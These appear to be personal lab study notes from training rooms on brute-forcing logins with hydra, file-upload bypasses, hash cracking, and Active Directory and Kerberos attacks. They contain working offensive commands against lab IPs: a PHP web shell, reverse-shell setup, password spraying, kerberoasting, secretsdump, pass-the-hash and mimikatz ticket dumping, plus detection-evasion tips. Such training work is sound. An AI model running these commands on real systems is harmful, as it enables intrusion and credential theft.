  hydra -t 4 -l admin@juice-sh.op -P /usr/share/seclists/Passwords/Common-Credentials/best1050.txt 10.10.223.38 http-post-form "/#/login:password=^PASS^=yes&login=Log+In&proc_login=true:Invalid email or password."

#Another use of hydra
hydra -L users.txt -P /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -f 10.10.82.175 -s 8080 http-get /manager/html #Not worked
hydra -l jan -t 4 -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt ssh://10.10.55.243

Consider the following concrete examples:

    hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.10.186.248 ftp will use mark as the username as it iterates over the provided passwords against the FTP server.
    hydra -l mark -P /usr/share/wordlists/rockyou.txt ftp://10.10.186.248 is identical to the previous example. 10.10.186.248 ftp is the same as ftp://10.10.186.248.
    hydra -l frank -P /usr/share/wordlists/rockyou.txt 10.10.186.248 ssh will use frank as the user name as it tries to login via SSH using the different passwords.
    hydra -l <username> -P <wordlist> 10.10.22.33 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
    hydra -t 4 -I -l molly -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt 10.10.22.33 http-post-form "/login/:username=molly&password=^PASS^:Your username or password is incorrect."
    hydra -L usernames -P passwords 192.208.137.3 http-post-form
"/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid
credentials or user not activated!"

There are some extra optional arguments that you can add:

    -s PORT to specify a non-default port for the service in question.
    -V or -vV, for verbose, makes Hydra show the username and password combinations that are being tried. This verbosity is very convenient to see the progress, especially if you are still not confident of your command-line syntax.
    -t n where n is the number of parallel connections to the target. -t 16 will create 16 threads used to connect to the target.
    -d, for debugging, to get more detailed information about what’s going on. The debugging output can save you much frustration; for instance, if Hydra tries to connect to a closed port and timing out, -d will reveal this right away.


3. Poison Null Byte
Example: http://10.10.181.162/ftp/package.json.bak >> http://10.10.181.162/ftp/package.json.bak%2500.md  ||| URL encoding

==============================================
Room: Upload vulnerabilities

hosts file do and undo:
  Linux and MacOS ==> /etc/hosts
  sudo sed -i '$d' /etc/hosts

  Windows ==> C:\Windows\System32\drivers\etc\hosts
  (GC C:\Windows\System32\drivers\etc\hosts | select -Skiplast 1) | SC C:\Windows\System32\drivers\etc\hosts

Overwriting existing files
  Uploading a different file with same name
RCE
  web shell
    <?php echo system($_GET["cmd"]);?>
    <?php system("whoami")?>
    wfuzz --hc=404 -c -t 200 -u http://overwrite.uploadvulns.thm/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
    gobuster -x php,txt,html
    After that, go to http://shell.uploadvulns.thm/resources/malicious.php?cmd=id;ls;whoami
  reverse shell
    https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
    nc -lvnp 4126
    After that, go to http://shell.uploadvulns.thm/resources/malicious.php

Filtering
  Extension validation
    MS Windows still uses them to identify file types
    Unix use magic numbers
  File type filtering
    MIME validation
      (Multipurpose Internet Mail Extension) types are used as an identifier for files -- originally when transfered as attachments over email, but now also when files are being transferred over HTTP(S). The MIME type for a file upload is attached in the header of the request with the format <type>/<subtype>
        Content-Type: image/jpeg
    Magic number validation
  FIle length
  file name     
    "bad characters"
  file content

  Bypassing client-side filtering
    Turn off Javascript in your browser -- this will work provided the site doesn't require Javascript in order to provide basic functionality. If turning off Javascript completely will prevent the site from working at all then one of the other methods would be more desirable; otherwise, this can be an effective way of completely bypassing the client-side filter.
    
    Intercept and modify the incoming page. Using Burpsuite, we can intercept the incoming web page and strip out the Javascript filter before it has a chance to run. The process for this will be covered below. It's worth noting here that Burpsuite will not, by default, intercept any external Javascript files that the web page is loading. If you need to edit a script which is not inside the main page being loaded, you'll need to go to the "Options" tab at the top of the Burpsuite window, then under the "Intercept Client Requests" section, edit the condition of the first line to remove ^js$|:
      Example: Refresh page and do intercept > response to this request with burp. Eliminate or comment unwanted function. Forward.

    Intercept and modify the file upload. Where the previous method works before the webpage is loaded, this method allows the web page to load as normal, but intercepts the file upload after it's already passed (and been accepted by the filter). Again, we will cover the process for using this method in the course of the task.
        Example with a legitimate extension: Intercept when uploading the message and changing extension and MIME

    Send the file directly to the upload point. Why use the webpage with the filter, when you can send the file directly using a tool like curl? Posting the data directly to the page which contains the code for handling the file upload is another effective method for completely bypassing a client side filter. We will not be covering this method in any real depth in this tutorial, however, the syntax for such a command would look something like this: curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>. To use this method you would first aim to intercept a successful upload (using Burpsuite or the browser console) to see the parameters being used in the upload, which can then be slotted into the above command

  BYpassing server-side filtering: 
    File extensions
      Another example would be testing which is a valid extension and upload other file with 2 extensions. Valid: dog.jpg | Not valid malicious.php | Valid to access: malicious.jpg.php or malicious.jpg.php5

    Magic numbers
      Using hexeditor to check first 8 hex characters and file 
      We could use vim with :%!xxd. To save changes :%!xxd -r
====================
Hashing 

    You can't encrypt the passwords, as the key has to be stored somewhere. If someone gets the key, they can just decrypt the passwords.

    This is where hashing comes in. What if, instead of storing the password, you just stored the hash of the password? This means you never have to store the user's password, and if your database was leaked then an attacker would have to crack each password to find out what the password was. That sounds fairly useful.

    There's just one problem with this. What if two users have the same password? As a hash function will always turn the same input into the same output, you will store the same password hash for each user. That means if someone cracks that hash, they get into more than one account. It also means that someone can create a "Rainbow table" to break the hashes.

    A rainbow table is a lookup table of hashes to plaintexts, so you can quickly find out what password a user had just from the hash. A rainbow table trades time taken to crack a hash for hard disk space, but they do take time to create.


    To protect against rainbow tables, we add a salt to the passwords. The salt is randomly generated and stored in the database, unique to each user. In theory, you could use the same salt for all users but that means that duplicate passwords would still have the same hash, and a rainbow table could still be created specific passwords with that salt.

    The salt is added to either the start or the end of the password before it’s hashed, and this means that every user will have a different password hash even if they have the same password. Hash functions like bcrypt and sha512crypt handle this automatically. Salts don’t need to be kept private.



    Unix style password hashes are very easy to recognise, as they have a prefix. The prefix tells you the hashing algorithm used to generate the hash. The standard format is$format$rounds$salt$hash.

    Windows passwords are hashed using NTLM, which is a variant of md4. They're visually identical to md4 and md5 hashes, so it's very important to use context to work out the hash type.

    On Linux, password hashes are stored in /etc/shadow. This file is normally only readable by root. They used to be stored in /etc/passwd, and were readable by everyone.

    On Windows, password hashes are stored in the SAM. Windows tries to prevent normal users from dumping them, but tools like mimikatz exist for this. Importantly, the hashes found there are split into NT hashes and LM hashes.


============================
John the ripper

john --format=[format] --wordlist=[path]

  A Note on Formats:
    When you are telling john to use formats, if you're dealing with a standard hash type, e.g. md5 as in the example above, you have to prefix it with raw- to tell john you're just dealing with a standard hash type, though this doesn't always apply. To check if you need to add the prefix or not, you can list all of John's formats using john --list=formats and either check manually, or grep for your hash type using something like john --list=formats | grep -iF "md5".

NTHash / NTLM

  NThash is the hash format that modern Windows Operating System machines will store user and service passwords in. It's also commonly referred to as "NTLM" which references the previous version of Windows format for hashing passwords known as "LM", thus "NT/LM".

  A little bit of history, the NT designation for Windows products originally meant "New Technology", and was used- starting with Windows NT, to denote products that were not built up from the MS-DOS Operating System. Eventually, the "NT" line became the standard Operating System type to be released by Microsoft and the name was dropped, but it still lives on in the names of some Microsoft technologies. 

  You can acquire NTHash/NTLM hashes by dumping the SAM database on a Windows machine, by using a tool like Mimikatz or from the Active Directory database: NTDS.dit. You may not have to crack the hash to continue privilege escalation- as you can often conduct a "pass the hash" attack instead, but sometimes hash cracking is a viable option if there is a weak password policy

Unshadowing
  unshadow [path to passwd] [path to shadow]
  unshadow - Invokes the unshadow tool
  [path to passwd] - The file that contains the copy of the /etc/passwd file you've taken from the target machine
  [path to shadow] - The file that contains the copy of the /etc/shadow file you've taken from the target machine 

Using single crack mode
  john --single --format=[format] [path to file]

  A Note on File Formats in Single Crack Mode:
    If you're cracking hashes in single crack mode, you need to change the file format that you're feeding john for it to understand what data to create a wordlist from. You do this by prepending the hash with the username that the hash belongs to, so according to the above example- we would change the file hashes.txt
    From:
    1efee03cdcb96d90ad48ccc7b8666033
    To
    mike:1efee03cdcb96d90ad48ccc7b8666033


How to create Custom Rules

  Custom rules are defined in the john.conf file, usually located in /etc/john/john.conf if you have installed John using a package manager or built from source with make and in /opt/john/john.conf on the TryHackMe Attackbox.

  Let's go over the syntax of these custom rules, using the example above as our target pattern. Note that there is a massive level of granular control that you can define in these rules, I would suggest taking a look at the wiki here in order to get a full view of the types of modifier you can use, as well as more examples of rule implementation.

  The first line:
  [List.Rules:THMRules] - Is used to define the name of your rule, this is what you will use to call your custom rule as a John argument.
  We then use a regex style pattern match to define where in the word will be modified, again- we will only cover the basic and most common modifiers here:
  Az - Takes the word and appends it with the characters you define
  A0 - Takes the word and prepends it with the characters you define
  c - Capitalises the character positionally

  These can be used in combination to define where and what in the word you want to modify.

  Lastly, we then need to define what characters should be appended, prepended or otherwise included, we do this by adding character sets in square brackets [ ] in the order they should be used. These directly follow the modifier patterns inside of double quotes " ". Here are some common examples:

  https://campus.barracuda.com/product/campus/doc/5472273/regular-expressions
  [0-9] - Will include numbers 0-9
  [0] - Will include only the number 0
  [A-z] - Will include both upper and lowercase
  [A-Z] - Will include only uppercase letters
  [a-z] - Will include only lowercase letters
  [a] - Will include only a
  [!£$%@] - Will include the symbols !£$%@


  Putting this all together, in order to generate a wordlist from the rules that would match the example password "Polopassword1!" (assuming the word polopassword was in our wordlist) we would create a rule entry that looks like this:
  [List.Rules:PoloPassword]
  cAz"[0-9] [!£$%@]"

  In order to:
    Capitalise the first  letter - c
    Append to the end of the word - Az
    A number in the range 0-9 - [0-9]
    Followed by a symbol that is one of [!£$%@]
  
  Using Custom Rules
  We could then call this custom rule as a John argument using the  --rule=PoloPassword flag.
  As a full command: john --wordlist=[path to wordlist] --rule=PoloPassword [path to file]
  As a note I find it helpful to talk out the patterns if you're writing a rule- as shown above, the same applies to writing RegEx patterns too.

  Jumbo John already comes with a large list of custom rules, which contain modifiers for use almost all cases. If you get stuck, try looking at those rules [around line 678] if your syntax isn't working properly.
-=-=-=-=-

Cracking password protected zip file
Zip2John

  Similarly to the unshadow tool that we used previously, we're going to be using the zip2john tool to convert the zip file into a hash format that John is able to understand, and hopefully crack. The basic usage is like this:
  zip2john [options] [zip file] > [output file]
  [options] - Allows you to pass specific checksum options to zip2john, this shouldn't often be necessary
  [zip file] - The path to the zip file you wish to get the hash of
  > - This is the output director, we're using this to send the output from this file to the...
  [output file] - This is the file that will store the output from

  Example Usage
    zip2john zipfile.zip > zip_hash.txt
-=-=-=-=
Cracking a password protected RAR archive
Rar2John

  Almost identical to the zip2john tool that we just used, we're going to use the rar2john tool to convert the rar file into a hash format that John is able to understand. The basic syntax is as follows:
  rar2john [rar file] > [output file]
  rar2john - Invokes the rar2john tool
  [rar file] - The path to the rar file you wish to get the hash of
  > - This is the output director, we're using this to send the output from this file to the...
  [output file] - This is the file that will store the output from

  Example Usage
    rar2john rarfile.rar > rar_hash.txt

--=-=-=-=-
Cracking SSH key passwords

  Note that if you don't have ssh2john installed, you can use ssh2john.py, which is located in the /opt/john/ssh2john.py. If you're doing this, replace the ssh2john command with python3 /opt/ssh2john.py or on Kali, python /usr/share/john/ssh2john.py.

  ssh2john [id_rsa private key file] > [output file]

  ssh2john - Invokes the ssh2john tool

  [id_rsa private key file] - The path to the id_rsa file you wish to get the hash of

  > - This is the output director, we're using this to send the output from this file to the...
  [output file] - This is the file that will store the output from 

=====================================================
Encryption - Crypto 101

  Passphrase - Separate to the key, a passphrase is similar to a password and used to protect a key.

DO NOT encrypt passwords unless you’re doing something like a password manager. Passwords should not be stored in plaintext, and you should use hashing to manage them safely.
An important thing to remember about modulo is that it’s not reversible. If I gave you an equation: x % 5 = 4, there are infinite values of x that will be valid.

The two main categories of Encryption are symmetric and asymmetric.

  Symmetric encryption uses the same key to encrypt and decrypt the data. Examples of Symmetric encryption are DES (Broken) and AES. These algorithms tend to be faster than asymmetric cryptography, and use smaller keys (128 or 256 bit keys are common for AES, DES keys are 56 bits long).

  Asymmetric encryption uses a pair of keys, one to encrypt and the other in the pair to decrypt. Examples are RSA and Elliptic Curve Cryptography. Normally these keys are referred to as a public key and a private key. Data encrypted with the private key can be decrypted with the public key, and vice versa. Your private key needs to be kept private, hence the name. Asymmetric encryption tends to be slower and uses larger keys, for example RSA typically uses 2048 to 4096 bit keys.

=-=-=-=-=
The math(s) side

  RSA is based on the mathematically difficult problem of working out the factors of a large number. It’s very quick to multiply two prime numbers together, say 17*23 = 391, but it’s quite difficult to work out what two prime numbers multiply together to make 14351 (113x127 for reference).
  The attacking side

  The maths behind RSA seems to come up relatively often in CTFs, normally requiring you to calculate variables or break some encryption based on them. The wikipedia page for RSA seems complicated at first, but will give you almost all of the information you need in order to complete challenges.

  There are some excellent tools for defeating RSA challenges in CTFs, and my personal favorite is https://github.com/Ganapati/RsaCtfTool which has worked very well for me. I’ve also had some success with https://github.com/ius/rsatool.

  The key variables that you need to know about for RSA in CTFs are p, q, m, n, e, d, and c.

  “p” and “q” are large prime numbers, “n” is the product of p and q.

  The public key is n and e, the private key is n and d.

  “m” is used to represent the message (in plaintext) and “c” represents the ciphertext (encrypted text).

-=-=-=-=-=-
SSH authentication
ssh-keygen
  It’s very important to mention that the passphrase to decrypt the key isn’t used to identify you to the server at all, all it does is decrypt the SSH key. The passphrase is never transmitted, and never leaves your system.

ssh -i [keyNameGoesHere] user@host

gpg2john

=======================================
Basics of AD 

The Active Directory Data Store holds the databases and processes needed to store and manage directory information such as users, groups, and services. Below is an outline of some of the contents and characteristics of the AD DS Data Store:

    Contains the NTDS.dit - a database that contains all of the information of an Active Directory domain controller as well as password hashes for domain users
    Stored by default in %SystemRoot%\NTDS
    accessible only by the domain controller

A forest consists of these parts:
  Trees - A hierarchy of domains in Active Directory Domain Services
  Domains - Used to group and manage objects 
  Organizational Units (OUs) - Containers for groups, computers, users, printers and other OUs
  Trusts - Allows users to access resources in other domains
  Objects - users, groups, printers, computers, shares
  Domain Services - DNS Server, LLMNR, IPv6
  Domain Schema - Rules for object creation

The four types of users are: 
  Domain Admins - This is the big boss: they control the domains and are the only ones with access to the domain controller.
  Service Accounts (Can be Domain Admins) - These are for the most part never used except for service maintenance, they are required by Windows for services such as SQL to pair a service with a service account
  Local Administrators - These users can make changes to local machines as an administrator and may even be able to control other normal users, but they cannot access the domain controller
  Domain Users - These are your everyday users. They can log in on the machines they have the authorization to access and may have local administrator rights to machines depending on the organization

Active Directory groups: 

    Security Groups - These groups are used to specify permissions for a large number of users
    Distribution Groups - These groups are used to specify email distribution lists. As an attacker these groups are less beneficial to us but can still be beneficial in enumeration

Default Security Groups - 

  There are a lot of default security groups so I won't be going into too much detail of each past a brief description of the permissions that they offer to the assigned group. Here is a brief outline of the security groups:

    Domain Controllers - All domain controllers in the domain
    Domain Guests - All domain guests
    Domain Users - All domain users
    Domain Computers - All workstations and servers joined to the domain
    Domain Admins - Designated administrators of the domain
    Enterprise Admins - Designated administrators of the enterprise
    Schema Admins - Designated administrators of the schema
    DNS Admins - DNS Administrators Group
    DNS Update Proxy - DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).
    Allowed RODC Password Replication Group - Members in this group can have their passwords replicated to all read-only domain controllers in the domain
    Group Policy Creator Owners - Members in this group can modify group policy for the domain
    Denied RODC Password Replication Group - Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
    Protected Users - Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.
    Cert Publishers - Members of this group are permitted to publish certificates to the directory
    Read-Only Domain Controllers - Members of this group are Read-Only Domain Controllers in the domain
    Enterprise Read-Only Domain Controllers - Members of this group are Read-Only Domain Controllers in the enterprise
    Key Admins - Members of this group can perform administrative actions on key objects within the domain.
    Enterprise Key Admins - Members of this group can perform administrative actions on key objects within the forest.
    Cloneable Domain Controllers - Members of this group that are domain controllers may be cloned.
    RAS and IAS Servers - Servers in this group can access remote access properties of users

-=-=-=-=-=
Trusts & policies
In some environments trusts can be extended out to external domains and even forests in some cases.

The two types of trusts below: 

    Directional - The direction of the trust flows from a trusting domain to a trusted domain
    Transitive - The trust relationship expands beyond just two domains to include other trusted domains

Domain Policies Overview - 

  Policies are a very big part of Active Directory, they dictate how the server operates and what rules it will and will not follow. You can think of domain policies like domain groups, except instead of permissions they contain rules, and instead of only applying to a group of users, the policies apply to a domain as a whole. They simply act as a rulebook for Active  Directory that a domain admin can modify and alter as they deem necessary to keep the network running smoothly and securely. Along with the very long list of default domain policies, domain admins can choose to add in their own policies not already on the domain controller, for example: if you wanted to disable windows defender across all machines on the domain you could create a new group policy object to disable Windows Defender

-=-=-=-=-=
Outlined below are the default domain services: 

    LDAP - Lightweight Directory Access Protocol; provides communication between applications and directory services
    Certificate Services - allows the domain controller to create, validate, and revoke public key certificates
    DNS, LLMNR, NBT-NS - Domain Name Services for identifying IP hostnames

Domain authentication overview
    Kerberos - The default authentication service for Active Directory uses ticket-granting tickets and service tickets to authenticate users and give users access to other resources across the domain.
    NTLM - default Windows authentication protocol uses an encrypted challenge/response protocol

-=-=-=-=-=-=
AD Cloud


Windows Server AD	Azure AD
LDAP	                Rest APIs
NTLM	                OAuth/SAML
Kerberos	        OpenID
OU Tree	                Flat Structure
Domains and Forests	Tenants
Trusts	                Guests
--=-=-=-=-=
AD commands

Get-NetComputer -fulldata | select operatingsystem #gets a list of all operating systems on the domain
Get-NetUser | select cn #gets a list of all users on the domain
Get-ADUser -identity SQLService -properties * # Check properties
(get-wmiobject -class win32_computersystem).partofdomain

-=-=-=-=-=-=
AD attacks
Tools needed
  impacket
  bloodhound
  neo4j

With Kerberos we can use Kerbrute
kerbrute userenum -d spookysec.local --dc 10.10.246.78 userlist.txt

After the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called ASREPRoasting. ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

Impacket has a tool called "GetNPUsers.py" (located in impacket/examples/GetNPUsers.py) that will allow us to query ASReproastable accounts from the Key Distribution Center. The only thing that's necessary to query accounts is a valid set of usernames which we enumerated previously via Kerbrute.

GetNPUsers.py spookysec.local/ -usersfile after_kerbrute.txt -format john -output results.txt

smbclient -U "svc-admin" \\\\10.10.134.44\\backup

Well, it is the backup account for the Domain Controller. This account has a unique permission that allows all Active Directory changes to be synced with this user account. This includes password hashes. Knowing this, we can use another tool within Impacket called "secretsdump.py". This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer. Exploiting this, we will effectively have full control over the AD Domain.

secretsdump.py spookysec.local/backup:backup2517860@10.10.248.76 -outputfile results_secretsdump.txt

evil-winrm -i 10.10.248.76 -u 'administrator' -H '0e0363213e37b94221497260b0bcb4fc'

--=-=-=--=-=-=
What is Kerberos?
Kerberos is the default authentication service for Microsoft Windows domains. It is intended to be more "secure" than NTLM by using third party ticket authorization as well as stronger encryption. Even though NTLM has a lot more attack vectors to choose from Kerberos still has a handful of underlying vulnerabilities just like NTLM that we can use to our advantage.


Ticket Granting Ticket (TGT) - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
Key Distribution Center (KDC) - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
Authentication Service (AS) - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.

Ticket Granting Service (TGS) - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.
Service Principal Name (SPN) - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
KDC Long Term Secret Key (KDC LT Key) - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.

Client Long Term Secret Key (Client LT Key) - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
Service Long Term Secret Key (Service LT Key) - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
Session Key - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
Privilege Attribute Certificate (PAC) - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.

AS-REQ w/ Pre-Authentication In Detail - 
The AS-REQ step in Kerberos authentication starts when a user requests a TGT from the KDC. In order to validate the user and create a TGT for the user, the KDC must follow these exact steps. The first step is for the user to encrypt a timestamp NT hash and send it to the AS. The KDC attempts to decrypt the timestamp using the NT hash from the user, if successful the KDC will issue a TGT as well as a session key for the user.

Ticket Granting Ticket Contents -
In order to understand how the service tickets get created and validated, we need to start with where the tickets come from; the TGT is provided by the user to the KDC, in return, the KDC validates the TGT and returns a service ticket.

Service Ticket Contents - 
To understand how Kerberos authentication works you first need to understand what these tickets contain and how they're validated. A service ticket contains two portions: the service provided portion and the user-provided portion. I'll break it down into what each portion contains.

    Service Portion: User Details, Session Key, Encrypts the ticket with the service account NTLM hash.
    User Portion: Validity Timestamp, Session Key, Encrypts with the TGT session key.

Kerberos Authentication Overview -

AS-REQ - 1.) The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).

AS-REP - 2.) The Key Distribution Center verifies the client and sends back an encrypted TGT.

TGS-REQ - 3.) The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.

TGS-REP - 4.) The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.

AP-REQ - 5.) The client requests the service and sends the valid session key to prove the user has access.

AP-REP - 6.) The service grants access 

Kerberos Tickets Overview - 

The main ticket that you will see is a ticket-granting ticket these can come in various forms such as a .kirbi for Rubeus .ccache for Impacket. The main ticket that you will see is a .kirbi ticket. A ticket is typically base64 encoded and can be used for various attacks. The ticket-granting ticket is only used with the KDC in order to get service tickets. Once you give the TGT the server then gets the User details, session key, and then encrypts the ticket with the service account NTLM hash. Your TGT then gives the encrypted timestamp, session key, and the encrypted TGT. The KDC will then authenticate the TGT and give back a service ticket for the requested service. A normal TGT will only work with that given service account that is connected to it however a KRBTGT allows you to get any service ticket that you want allowing you to access anything on the domain that you want.

Attack Privilege Requirements -

    Kerbrute Enumeration - No domain access required 
    Pass the Ticket - Access as a user to the domain required
    Kerberoasting - Access as any user required
    AS-REP Roasting - Access as any user required
    Golden Ticket - Full domain compromise (domain admin) required 
    Silver Ticket - Service hash required 
    Skeleton Key - Full domain compromise (domain admin) required
---===--===-==

Enumeration w/Kerbrute
You need to add the DNS domain name along with the machine IP to /etc/hosts inside of your attacker machine or these attacks will not work for you - 10.10.55.165  CONTROLLER.local    

Abusing Pre-Authentication Overview -

By brute-forcing Kerberos pre-authentication, you do not trigger the account failed to log on event which can throw up red flags to blue teams. When brute-forcing through Kerberos you can brute-force by only sending a single UDP frame to the KDC allowing you to enumerate the users on the domain from a wordlist.
1. kerbrute userenum -d spookysec.local --dc 10.10.246.78 userlist.txt

-=-=-=-=
Harvesting & Brute-Forcing tickets w/Rubeus

Rubeus.exe harvest /interval:30 This command tells Rubeus to harvest for TGTs every 30 seconds

Brute-Forcing / Password-Spraying w/ Rubeus -

Rubeus can both brute force passwords as well as password spray user accounts. When brute-forcing passwords you use a single user account and a wordlist of passwords to see which password works for that given user account. In password spraying, you give a single password such as Password1 and "spray" against all found user accounts in the domain to find which one may have that password.

This attack will take a given Kerberos-based password and spray it against all found users and give a .kirbi ticket. This ticket is a TGT that can be used in order to get service tickets from the KDC as well as to be used in attacks like the pass the ticket attack.

Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file. You can add the IP and domain name to the hosts file from the machine by using the echo command: 

echo 10.10.55.165 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
Rubeus.exe brute /password:Password1 /noticket - This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user

-=-=-=-=
Kerberoasting w/Rubeus & Impacket
Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account. To enumerate Kerberoastable accounts I would suggest a tool like BloodHound to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain

Method 1 - Rubeus
Rubeus.exe kerberoast This will dump the Kerberos hash of any kerberoastable users
hashcat -m 13100 -a 0 hash.txt Pass.txt - now crack that hash

Method 2 - Impacket
sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.55.165 -request - this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.
hashcat -m 13100 -a 0 hash.txt Pass.txt - now crack that hash

Kerberoasting Mitigation
Don't Make Service Accounts Domain Admins - Service accounts don't need to be domain admins, kerberoasting won't be as effective if you don't make service accounts domain admins.

-=-=-=-==
AS-REP Roasting w/Rubeus 
Very similar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled. Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.

We'll continue using Rubeus same as we have with kerberoasting and harvesting since Rubeus has a very simple and easy to understand command to AS-REP roast and attack users with Kerberos pre-authentication disabled. After dumping the hash from Rubeus we'll use hashcat in order to crack the krbasrep5 hash.

There are other tools out as well for AS-REP Roasting such as kekeo and Impacket's GetNPUsers.py. Rubeus is easier to use because it automatically finds AS-REP Roastable users whereas with GetNPUsers you have to enumerate the users beforehand and know which users may be AS-REP Roastable.


AS-REP Roasting Overview - 

During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.

Dumping KRBASREP5 Hashes w/ Rubeus -
  Rubeus.exe asreproast - This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.
Crack those Hashes w/ hashcat - 
  Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....

AS-REP Roasting Mitigations - 

    Have a strong password policy. With a strong password, the hashes will take longer to crack making this attack less effective

    Don't turn off Kerberos Pre-Authentication unless it's necessary there's almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.
-=-=-=-=-=
Pass the ticket w/ mimikatz 
Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network however well be using mimikatz in order to dump a TGT from LSASS memory

Pass the Ticket Overview - 
Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes. When you dump the tickets with mimikatz it will give us a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory. This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets laying around. The attack allows you to escalate to domain admin if you dump a domain admin's ticket and then impersonate that ticket using mimikatz PTT attack allowing you to act as that domain admin. You can think of a pass the ticket attack like reusing an existing ticket were not creating or destroying any tickets here were simply reusing an existing ticket from another user on the domain and impersonating that ticket.

First, we utilize UACME to bypass UAC protection and get “Debug Privileges” and “High Integrity”. We can use “whoami /all” to check current privileges and the integrity level

mimikatz.exe
privilege::debug - Ensure this outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz
sekurlsa::tickets /export - this will export all of the .kirbi tickets into the directory that you are currently in

1.) kerberos::ptt <ticket> - run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket

2.) klist - Here were just verifying that we successfully impersonated the ticket by listing our cached tickets.


Pass the Ticket Mitigation -

Let's talk blue team and how to mitigate these types of attacks. 

    Don't let your domain admins log onto anything except the domain controller - This is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with.
-=-=-=-=-=-=
Golden/Silver Ticket Attacks w/ mimikatz 

Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network however well be using mimikatz in order to create a silver ticket.

A silver ticket can sometimes be better used in engagements rather than a golden ticket because it is a little more discreet. If stealth and staying undetected matter then a silver ticket is probably a better option than a golden ticket however the approach to creating one is the exact same. The key difference between the two tickets is that a silver ticket is limited to the service that is targeted whereas a golden ticket has access to any Kerberos service.

A specific use scenario for a silver ticket would be that you want to access the domain's SQL server however your current compromised user does not have access to that server. You can find an accessible service account to get a foothold with by kerberoasting that service, you can then dump the service hash and then impersonate their TGT in order to request a service ticket for the SQL service from the KDC allowing you access to the domain's SQL server.

KRBTGT Overview 

In order to fully understand how these attacks work you need to understand what the difference between a KRBTGT and a TGT is. A KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients. If you impersonate this account and create a golden ticket form the KRBTGT you give yourself the ability to create a service ticket for anything you want. A TGT is a ticket to a service account issued by the KDC and can only access that service the TGT is from like the SQLService ticket.

Golden/Silver Ticket Attack Overview - 

A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket. This will provide you with the service/domain admin account's SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates the given service account information.

Dump the krbtgt hash -
  privilege::debug - ensure this outputs [privilege '20' ok]
